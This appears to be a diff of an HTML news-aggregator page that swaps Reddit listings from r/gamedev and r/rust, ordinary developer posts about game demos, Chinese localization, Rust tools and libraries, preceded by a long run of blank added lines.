+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    </div>
+    
+
+  </div>
+</div>
+
+<script src="/js/play.js"></script>
+
+</div>
+          </li>
   
+        </ul>
       </div>
   
       <div class="card">
         <h2>Reddit</h2>
   
-        <h3 class="subreddit">r/gamedev</h3>
-        <ul class="item-list">
-  
-          <li>
-            <a href="https://www.reddit.com/r/gamedev/comments/1r6uy67/how_does_a_game_like_roblox_work/" target="_blank">How does a game like Roblox work?</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hi,</p> <p>I am a indie dev (In Roblox and in C++) and I dont even know if this is the right subreddit to post on but ive wondering how a game like Roblox works. I am pretty experienced with Roblox as Ive been playing since 2018 so I kinda know how the platform works (Servers, Clients, etc). But how does it work behind the scenes? I googled it and it said something about TCP and UDP or something.</p> <p>Ive been wanting to code something like Roblox (As a fun little hobby and probally not gonna release it) though I want to learn about how the servers could work. Could something like Cloudfair tunnels work?</p> <p>If anyone could help that would be great or even just tell me which subreddit I should post on.</p> <p>Thanks!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Puppyrjcw"> /u/Puppyrjcw </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r6uy67/how_does_a_game_like_roblox_work/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r6uy67/how_does_a_game_like_roblox_work/">[comments]</a></span></div>
-          </li>
-  
-          <li>
-            <a href="https://www.reddit.com/r/gamedev/comments/1r6tx4s/is_a_time_limit_a_bad_way_to_contentlimit_a_demo/" target="_blank">Is a time limit a bad way to content-limit a demo for a game without linear levels? And what are some examples of games using this demo technique (except for Minecraft which I already know about)?</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I&#39;m making a game where the gameplay loop is dependent on the synergy between each enemy, gun, and powerup, and restricting any of these factors would give people playing a demo an inaccurate depiction of what playing my game is actually like. Furthermore, everything occurs on one, large map.</p> <p>Because there are no traditional &quot;levels&quot; (the game is kinda rogue-likey, where you survive as many days as you can and death is permanent) i cant just cut out the first few, most polished levels and make them my demo.</p> <p>thus, the best option seems to just apply a time limit, so players can experience everything the game has to offer, but only in a short burst.</p> <p>Assuming my game is enjoyable enough to want to play for longer than the demo allows, would this content-limiting technique be acceptable? Or would it piss players off, make them feel like they&#39;ve &quot;seen enough&quot;, or end in some other unforseen outcome?</p> <p>If so, what other ways are there to content-limit a demo for a non-linear game?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Venison-County-Dev"> /u/Venison-County-Dev </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r6tx4s/is_a_time_limit_a_bad_way_to_contentlimit_a_demo/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r6tx4s/is_a_time_limit_a_bad_way_to_contentlimit_a_demo/">[comments]</a></span></div>
-          </li>
-  
-          <li>
-            <a href="https://www.reddit.com/r/gamedev/comments/1r6twjo/for_anyone_using_unreal_engine_we_posted_a_guide/" target="_blank">For anyone using Unreal Engine, we posted a guide on fixing the "Unreal Engine Look" we have all had to deal with</a>
-            <div class="item-content"><table> <tr><td> <a href="https://www.reddit.com/r/gamedev/comments/1r6twjo/for_anyone_using_unreal_engine_we_posted_a_guide/">  </a> </td><td> <!-- SC_OFF --><div class="md"><p>In this video we break down the drawbacks of Unreal&#39;s default ACES tonemapper, and how to install AgX as a superior alternative</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Typical-Interest-543"> /u/Typical-Interest-543 </a> <br/> <span><a href="https://www.youtube.com/watch?v=ciCRiQmwTrs">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r6twjo/for_anyone_using_unreal_engine_we_posted_a_guide/">[comments]</a></span> </td></tr></table></div>
-          </li>
-  
-          <li>
-            <a href="https://www.reddit.com/r/gamedev/comments/1r6q69s/how_to_sell_game_to_chinese_some_of_my_opinions/" target="_blank">How to sell game to chinese, some of my opinions</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><blockquote> <p>I write the core context by myself, and with help of gemini I turned them into better (hope it is) english.</p> </blockquote> <p>Here are some insights and tips regarding the Chinese market based on my observations as a local Chinese. If you are targeting Chinese players, keep these points in mind.</p> <p><strong>1. prioritize chinese localization</strong></p> <p>Ideally, launch your game with full Chinese localization. If resources are tight and you cannot manage full in-game translation at launch, at the very least, ensure your Steam store page and all announcements are translated. This shows respect and interest in the market.</p> <p>The market is big, Simplified Chinese is by far the second biggest language on Steam. <em>edited because Rocknroller658 reminds me of this, what a simple reason, the market IS there!</em></p> <p><strong>2. the &quot;no chinese, bad review&quot; phenomenon</strong></p> <p>Be prepared for negative reviews simply stating &quot;We need Chinese.&quot; This is especially common if your game supports EFIGS (English, French, Italian, German, Spanish) but omits Chinese. Ironically, players are often more forgiving if the game supports English only. seeing support for many other languages but excluding Chinese can feel like a deliberate slight to them.</p> <p><strong>3. managing expectations on workload</strong></p> <p>Many players on Chinese social media do not fully grasp the technical difficulty non-CJK developers face when implementing Chinese characters and font systems. They might perceive it as a simple text swap, unaware of the coding challenges involved. Patience is key when explaining this, but actions speak louder than words.</p> <p><strong>4. quality games earn community translations</strong></p> <p>If your game is truly excellent, the community will step up. Players will create unauthorized Chinese patches regardless of the difficulty or niche status of the game. We have seen this happen with extremely complex games like Dwarf Fortress and niche indie titles like Zaku Zaku Actors. Focus on making a great game first.</p> <p><strong>5. effective social media presence</strong></p> <p>If you have the bandwidth to manage a Chinese community, you need to be where they are. Do not just rely on Western platforms. Join Chinese social media channels tailored to your target demographic. For example, if video content is a major part of your marketing, Bilibili is essential, not YouTube. Try to communicate in Chinese, even if using translation tools, as it bridges the gap significantly.</p> <p><strong>6. cultural sensitivities to navigate</strong></p> <p>Understanding cultural nuances is crucial to avoid backlash.</p> <p>what works: Acknowledging Chinese New Year is generally well-received and appreciated.</p> <p>what to avoid: Steer clear of sensitive political or cultural topics. For instance, references to controversial historical sites like Yasukuni Shrine are deal-breakers. Also, be mindful of terminology; using &quot;Lunar New Year&quot; instead of &quot;Chinese New Year&quot; can sometimes trigger heated debates depending on the context. Tread carefully during interactions.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Sucaiking"> /u/Sucaiking </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r6q69s/how_to_sell_game_to_chinese_some_of_my_opinions/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r6q69s/how_to_sell_game_to_chinese_some_of_my_opinions/">[comments]</a></span></div>
-          </li>
-  
-          <li>
-            <a href="https://www.reddit.com/r/gamedev/comments/1r6k20y/we_just_released_a_documentary_about_my_6_year/" target="_blank">We just released a documentary about my 6 year journey building the indie game BIG HOPS.</a>
-            <div class="item-content"><table> <tr><td> <a href="https://www.reddit.com/r/gamedev/comments/1r6k20y/we_just_released_a_documentary_about_my_6_year/">  </a> </td><td> &#32; submitted by &#32; <a href="https://www.reddit.com/user/cjacobwade"> /u/cjacobwade </a> <br/> <span><a href="https://www.youtube.com/watch?v=Vtee39McAtY">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r6k20y/we_just_released_a_documentary_about_my_6_year/">[comments]</a></span> </td></tr></table></div>
-          </li>
-  
-          <li>
-            <a href="https://www.reddit.com/r/gamedev/comments/1r6jowi/is_there_any_catch_to_game_assets_bought_through/" target="_blank">Is there any catch to Game Assets bought through Humble Bundles?</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I saw a a very good deal for a humble bundle asset pack. But I&#39;ve never bought anything from humble bundles. Is there any catch to the humble bundle assets and their licenses. Or are they safe to invest?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/azwadkm22"> /u/azwadkm22 </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r6jowi/is_there_any_catch_to_game_assets_bought_through/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r6jowi/is_there_any_catch_to_game_assets_bought_through/">[comments]</a></span></div>
-          </li>
-  
-          <li>
-            <a href="https://www.reddit.com/r/gamedev/comments/1r6j5xl/for_2d_artist_collaborators_out_there/" target="_blank">For 2D artist collaborators out there</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>what attracts you to join (rev share) an existing project where you&#39;ll lead the artistic design (mood board, art style, etc)?</p> <p>do you have preference in the project length, or simply a duration of how long you think you can stay with the project?</p> <p>do you guys see the game filled with placeholders, and maybe provide your own take to a snippet of a game?</p> <p>i have an idea on how it should look like but I don&#39;t know how I&#39;ll execute it..</p> <p>Im in a position in my project development where im ready to seek aid from an artist who can make it look good but i dont want to simply post it out there without knowing what i should be showing to them.</p> <p>so here i am, asking your inputs, tyvm</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Revolutionary-Skin97"> /u/Revolutionary-Skin97 </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r6j5xl/for_2d_artist_collaborators_out_there/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r6j5xl/for_2d_artist_collaborators_out_there/">[comments]</a></span></div>
-          </li>
-  
-          <li>
-            <a href="https://www.reddit.com/r/gamedev/comments/1r6g7xd/how_do_you_systematically_debug_pixelart/" target="_blank">How do you systematically debug pixel-art jitter/misalignment across camera zoom levels?</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I&#39;m trying to remove jitter in a 2D pixel-art scene when the camera pans and zooms.</p> <p>Current checklist: - integer camera positions where possible - snap sprites to pixel grid in world space - disable texture filtering + mipmaps for pixel assets - keep consistent PPU/scaling ratios</p> <p>Where I still get issues: - subpixel movement on diagonal motion - tiny shimmer when zoom is between integer factors</p> <p>For those who solved this in production, what&#39;s your debugging flow and the first 2-3 metrics/visualizations you check?</p> <p>If useful, I can share my findings after I test suggestions.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/masterblinker"> /u/masterblinker </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r6g7xd/how_do_you_systematically_debug_pixelart/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r6g7xd/how_do_you_systematically_debug_pixelart/">[comments]</a></span></div>
-          </li>
-  
-          <li>
-            <a href="https://www.reddit.com/r/gamedev/comments/1r6dd34/is_anyone_else_here_over_25_making_a_game_using/" target="_blank">Is anyone else here over 25, making a game using Godot, and in the early stages of learning game development overall?</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I know a lot of people start making games earlier on in life, but I’m almost 40 and only got started about a year ago. I never had a job doing this or anything else in tech, and I also taught myself to code starting about 5 years ago.</p> <p>I’m thrilled that I did it, but honestly I want to connect with other people that are in a similar spot. Adults, likely with full time jobs and responsibilities, maybe having started a family, and game development is a dream, passion, or hobby.</p> <p>I posted about this in the Godot subreddit a few days ago and ended up creating a discord server that’s now got over 200 people in it. If Godot is your primary, and you are over 25, feel free to join us. We’re doing a game jam in March. Nobody is required to contribute, but I did set it up so that it’s easy to figure out where to go to get tips. So far it’s been a really positive experience.</p> <p>Here’s the link to it if you’re interested: <a href="https://discord.gg/FZgu5mChY">https://discord.gg/FZgu5mChY</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Sudden_Doughnut_8741"> /u/Sudden_Doughnut_8741 </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r6dd34/is_anyone_else_here_over_25_making_a_game_using/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r6dd34/is_anyone_else_here_over_25_making_a_game_using/">[comments]</a></span></div>
-          </li>
-  
-          <li>
-            <a href="https://www.reddit.com/r/gamedev/comments/1r6brck/what_are_your_takes_on_this_meme_is_this_good_or/" target="_blank">What are your takes on this meme? Is this good or bad design?</a>
-            <div class="item-content"><table> <tr><td> <a href="https://www.reddit.com/r/gamedev/comments/1r6brck/what_are_your_takes_on_this_meme_is_this_good_or/">  </a> </td><td> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Super_Inevitable776"> /u/Super_Inevitable776 </a> <br/> <span><a href="https://files.catbox.moe/q7gsx0.png">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r6brck/what_are_your_takes_on_this_meme_is_this_good_or/">[comments]</a></span> </td></tr></table></div>
-          </li>
-  
-          <li>
-            <a href="https://www.reddit.com/r/gamedev/comments/1r6bly4/does_being_a_successful_solo_dev_help_you_get/" target="_blank">Does being a successful solo dev help you get hired in the future?</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hypothetically if you were to become a successful solo dev. Would that be helpful on a resume to get hired?</p> <p>Edit: What if I wanted to lead a project or any other senior role? Would companies be hesitant about that? And by success I mean at least 1 million dollar revenue.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/PolymathLogic"> /u/PolymathLogic </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r6bly4/does_being_a_successful_solo_dev_help_you_get/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r6bly4/does_being_a_successful_solo_dev_help_you_get/">[comments]</a></span></div>
-          </li>
-  
-          <li>
-            <a href="https://www.reddit.com/r/gamedev/comments/1r699n6/im_making_a_game/" target="_blank">Im making a game</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hi everyone, i dont know if anyone will see this post but i wanna say that im making my first game and im trying my best, i pinned one screen of my first scene in game, wish me luck :)<br/> <a href="https://imgur.com/a/LiUdzjE">IMG</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/FlenzyFL"> /u/FlenzyFL </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r699n6/im_making_a_game/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r699n6/im_making_a_game/">[comments]</a></span></div>
-          </li>
-  
-        </ul>
-  
         <h3 class="subreddit">r/rust</h3>
         <ul class="item-list">
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r6rvqa/test_your_postgresql_database_like_a_sorcerer/" target="_blank">Test your PostgreSQL database like a sorcerer (using Rust built tool Spawn)</a>
-            <div class="item-content">&#32; submitted by &#32; <a href="https://www.reddit.com/user/Winsaucerer"> /u/Winsaucerer </a> <br/> <span><a href="https://docs.spawn.dev/blog/regression-tests/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r6rvqa/test_your_postgresql_database_like_a_sorcerer/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r7q6uv/add_hidden_field_to_rust_struct/" target="_blank">Add hidden field to Rust struct</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I’ve been trying to find a way to add an ID field to every Rust struct in an specific crate. I started doing this by using macros but then I found myself writing macros to change return values of the constructors because adding the ID field to the struct completely changes the type. I then moved on to work on the compiler: see if I could add a field to the struct at the MIR however I have not been successful thus far.</p> <p>The objective here is to be able to identify every instance of a struct of a particular type uniquely, but I do not want to make huge changes to the original source. </p> <p>Does anyone know of a reasonable approach for this?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/inky213"> /u/inky213 </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r7q6uv/add_hidden_field_to_rust_struct/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r7q6uv/add_hidden_field_to_rust_struct/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r6qq02/i_built_a_custom_2d_ecs_game_engine_in_rust_wgpu/" target="_blank">I built a custom 2D ECS Game Engine in Rust & wGPU that compiles to WASM. (Live Demo + Source)</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>It has been a wild ride so far!</p> <p>&quot;Journey&quot; is my long-term R&amp;D project to understand modern rendering pipelines and system architecture constraints. I intend to keep developing this indefinitely as a playground for graphics programming.</p> <p>The hardest technical hurdles so far were (but not limited to) were inverting control to avoid thread blocking, handling high-DPI/Retina scaling manually in wGPU, and fighting the borrow checker to build a System Runner that allows mutable component access without runtime panics.</p> <p><strong>Blog</strong> - <a href="https://ujjwalvivek.com/blog/proj_0004_rust_game_engine.md">https://ujjwalvivek.com/blog/proj_0004_rust_game_engine.md</a></p> <p><strong>Live Demo</strong>: <a href="https://journey.ujjwalvivek.com">https://journey.ujjwalvivek.com</a> </p> <p><strong>Source Code</strong>: <a href="https://github.com/ujjwalvivek/journey">https://github.com/ujjwalvivek/journey</a></p> <p>I am actively looking for others to hop on and work on this! If you&#39;ve been wanting to learn wGPU, experiment with ECS architecture, or just fix my terrible shaders, I&#39;d love to review your PRs.</p> <p>Happy to answer questions about the Rust -&gt; WASM pipeline or wGPU witchcraft!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/VicksTurtle"> /u/VicksTurtle </a> <br/> <span><a href="https://i.redd.it/uv99mf584yjg1.gif">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r6qq02/i_built_a_custom_2d_ecs_game_engine_in_rust_wgpu/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r7phlj/surrealdb_30/" target="_blank">SurrealDB 3.0</a>
+            <div class="item-content">&#32; submitted by &#32; <a href="https://www.reddit.com/user/zxyzyxz"> /u/zxyzyxz </a> <br/> <span><a href="https://surrealdb.com/blog/introducing-surrealdb-3-0--the-future-of-ai-agent-memory">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r7phlj/surrealdb_30/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r6prnx/what_would_your_tech_stack_be_for_a_new/" target="_blank">What would your tech stack be for a new greenfield Rust web service (REST/gRPC)?</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Let&#39;s say, you&#39;re asked to start a new web service at a company, and it will be a first service written in Rust. Eventually you&#39;ll need the usual components, like integrations with 3rd services (e.g., authentication and authorization), maybe gRPC or just REST, a PostgreSQL, Kafka, Redis, metrics/logs/observability (e.g., OpenTelemetry), and so on.</p> <p>What would your 2026 tech stack look like? Will it be something like <code>Axum</code> + <code>tonic</code> + <code>SQLx</code> + <code>Anyhow</code>?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Hixon11"> /u/Hixon11 </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r6prnx/what_would_your_tech_stack_be_for_a_new/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r6prnx/what_would_your_tech_stack_be_for_a_new/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r7pc6w/implementing_a_highperformance_rtl_simulator_for/" target="_blank">Implementing a High-Performance RTL Simulator for Veryl using Cranelift</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hello everyone!</p> <p>I am currently developing an RTL simulator for Veryl, a modern hardware description language. For those who haven&#39;t heard of it, Veryl is designed as a new alternative to SystemVerilog. It&#39;s implemented in Rust, and its syntax and tooling are heavily inspired by the Rust ecosystem. If you&#39;re interested, feel free to check out the site: <a href="https://veryl-lang.org">https://veryl-lang.org</a>.</p> <p>The initial implementation of the simulator used an interpreter to execute the parsed intermediate representation, but it was quite slow. I realized that binary translation was a must. By introducing binary generation via Cranelift and combining it with several optimizations including some <code>unsafe</code>, I&#39;ve successfully achieved a 300x speedup over the original interpreter.</p> <p>Another challenge with traditional RTL simulators is their slow startup time—often taking several seconds even for tiny designs. The Veryl simulator was already very fast at around 50ms in its interpreter stage, and even with Cranelift, we&#39;ve managed to maintain almost the same startup latency. Cranelift&#39;s fast compilation has been veryl useful here.</p> <p>I also ran some benchmarks against a major OSS RTL simulator.</p> <p><a href="https://preview.redd.it/5yxzamo2p5kg1.png?width=1086&amp;format=png&amp;auto=webp&amp;s=5decece28368c5f1f7b6254690e3655cbebc8d08">https://preview.redd.it/5yxzamo2p5kg1.png?width=1086&amp;format=png&amp;auto=webp&amp;s=5decece28368c5f1f7b6254690e3655cbebc8d08</a></p> <p>Verilator is widely considered the fastest RTL simulator in the world (even including commercial ones), but currently, the Veryl simulator is running about 3x faster. Since the implementation isn&#39;t complete yet, I expect some performance overhead in the final version, but I&#39;m confident we can maintain at least a 2x performance advantage. Looking ahead, I also plan to implement multi-threaded execution using rayon.</p> <p>Achieving this much progress in such a short time is a testament to Rust&#39;s language features and the incredible ecosystem, especially Cranelift. I&#39;m truly grateful to all the contributors out there.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/dalance1982"> /u/dalance1982 </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r7pc6w/implementing_a_highperformance_rtl_simulator_for/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r7pc6w/implementing_a_highperformance_rtl_simulator_for/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r6pan5/finplan_i_built_a_tui_app_to_help_plan_for/" target="_blank">FinPlan - I built a TUI app to help plan for retirement using Monte Carlo Simulations</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p><a href="https://github.com/jgrazian/finplan">https://github.com/jgrazian/finplan</a></p> <p>I&#39;ve been working on <a href="https://github.com/jgrazian/finplan">FinPlan</a>, a Monte Carlo retirement planning simulator that runs entirely in the terminal. It models multiple account types (401k, Roth, brokerage, real estate), tax-aware withdrawals, RSU vesting, and inflation-adjusted events, then runs thousands of simulations to estimate the probability your plan succeeds.</p> <p>Everything runs locally — no accounts, no cloud, no data leaves your machine.</p> <p>- Interactive TUI with vim-style keybindings (built with <a href="https://ratatui.rs/">ratatui</a>)</p> <p>- Event system with date/age triggers, recurring income/expenses, balance thresholds, almost a mini compiler/language in itself. Most but not all functionality exposed in GUI.</p> <p>- Return modeling with fixed, normal, or lognormal distributions (includes S&amp;P 500 historical presets)</p> <p>- Scenarios saved locally to ~/.finplan/scenarios/</p> <p>--</p> <p>Other web apps like this exist already however I was generally put off by the price of some of these tools. FinPlan is my attempt to get to 80% of the functionality but for ~free (only a few months of work in my free time :P).</p> <p>Full disclosure: Parts of the project were LLM-assisted but I hand-wrote and tested the overwhelming majority of the core engine myself.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Nattybr0h"> /u/Nattybr0h </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r6pan5/finplan_i_built_a_tui_app_to_help_plan_for/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r6pan5/finplan_i_built_a_tui_app_to_help_plan_for/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r7ol7f/january_2026_rust_jobs_report/" target="_blank">January 2026 Rust Jobs Report</a>
+            <div class="item-content">&#32; submitted by &#32; <a href="https://www.reddit.com/user/anonymous_pro_"> /u/anonymous_pro_ </a> <br/> <span><a href="https://filtra.io/rust/jobs-report/jan-26">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r7ol7f/january_2026_rust_jobs_report/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r6nl7o/kutamun_improved_spatial_navigation_library/" target="_blank">Kutamun - Improved Spatial Navigation Library</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Sorry to start another self-promotion so soon after the previous one, but, I&#39;d built a successor to Iced Spatial Navigation that is now decoupled from any UI framework and any pre-existing logic, letting you define everything you need to in order to tailor it to your project.<br/> Here&#39;s where you can find it:<br/> <a href="https://crates.io/crates/kutamun">https://crates.io/crates/kutamun</a><br/> <a href="https://github.com/JaydonXOneGitHub/Kutamun">https://github.com/JaydonXOneGitHub/Kutamun</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Adept-Letterhead-122"> /u/Adept-Letterhead-122 </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r6nl7o/kutamun_improved_spatial_navigation_library/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r6nl7o/kutamun_improved_spatial_navigation_library/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r7kruv/any_bioinformaticians_here_i_built_a_terminal/" target="_blank">Any Bioinformaticians here? I built a terminal based MSA browser using Rust + ratatui so I dont have to leave a HPC environment to quickly look at an alignment.</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hello all,</p> <p>Link to repo: <a href="https://github.com/Sam-Sims/salti">https://github.com/Sam-Sims/salti</a></p> <p>As a bioinformatician I found I needed to look at <a href="https://en.wikipedia.org/wiki/Multiple_sequence_alignment">multiple sequence alignments</a> a lot - which usually would require running an alignment job on a HPC, and then downloading the output to open with traditional GUI tools. I have been building salti as a side-project so I can open and browse MSA files straight from the terminal without leaving the HPC and wanted to share and see if any bioinformatians are lurking here and might find it useful.</p> <p>It currently only supports FASTA alignments (I plan to support others though - I just mainly deal with FASTA) - but both Nucleotide (NT) and Amino Acid (AA) alignments are supported (will try and guess when you load an alignment). My main aim was to have it fast and responsive, even when loading large alignments and gradually add features as I need them. I also love the helix editors command palette implementation - so I have implemented a similar thing here for navigation and commands.</p> <p>So far you can:</p> <ul> <li>Translate NT to AA on the fly</li> <li>Command Palette (like helix) for most commands</li> <li>Mouse selection and panning</li> <li>Filter sequences by names via regex</li> <li>Dynamic consensus and conservation calculations</li> <li>Pin sequences</li> <li>Set a reference</li> <li>Collpase positions to a diff agasint the reference or consensus</li> <li>Themes!</li> </ul> <p>I plan to add more features as I need them, but PRs or suggestions welcome!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/fuck_cops6"> /u/fuck_cops6 </a> <br/> <span><a href="https://i.redd.it/jpxtq84ro4kg1.png">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r7kruv/any_bioinformaticians_here_i_built_a_terminal/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r6l7fk/tokio_should_parking_lot_feature_be_enabled/" target="_blank">tokio: should parking_lot feature be enabled?</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I recently noticed tokio has an optional <code>parking_lot</code> feature that swaps the concurrency primitives used internally to parking_lot. Has anyone used this and seen any change in performance? Curious if anyone has production experiences with the feature enabled.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Leshow"> /u/Leshow </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r6l7fk/tokio_should_parking_lot_feature_be_enabled/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r6l7fk/tokio_should_parking_lot_feature_be_enabled/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r7ipxx/ggmath_a_games_math_library_with_const_generics/" target="_blank">`ggmath`: A games math library with const generics and SIMD</a>
